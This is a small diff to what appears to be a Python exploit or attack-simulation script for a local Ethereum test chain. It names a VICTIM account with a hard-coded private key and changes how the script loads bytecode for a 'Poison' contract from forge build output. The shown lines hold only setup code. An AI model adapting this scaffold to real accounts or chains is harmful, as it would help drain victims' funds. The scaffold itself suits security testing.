@@ -48,7 +48,17 @@ VICTIM   = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"        # SEPARATE accoun
 PK_VIC   = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
 
 # forge build once, then:  jq -r .bytecode out/Poison.sol/Poison.json
-POISON_INIT = "0x<PASTE_CREATION_BYTECODE_HERE>"
+# auto-load creation bytecode from forge build (running by run.sh)
+def _load_init():
+    p = pathlib.Path(__file__).resolve().parent / "out/Poison.sol/Poison.json"
+    try:
+        b = json.loads(p.read_text())["bytecode"]
+        if isinstance(b, dict): b = b.get("object", "")   # 
+        return b if b.startswith("0x") else "0x" + b
+    except Exception:
+        return ""
+POISON_INIT = _load_init()
+assert len(POISON_INIT) > 10, "empty bytecode — run: forge build (or ./run.sh)"
 # -----------------------------------------------------------------------------
 
 AMOUNT     = 10**15                       # 0.001 ETH per deposit
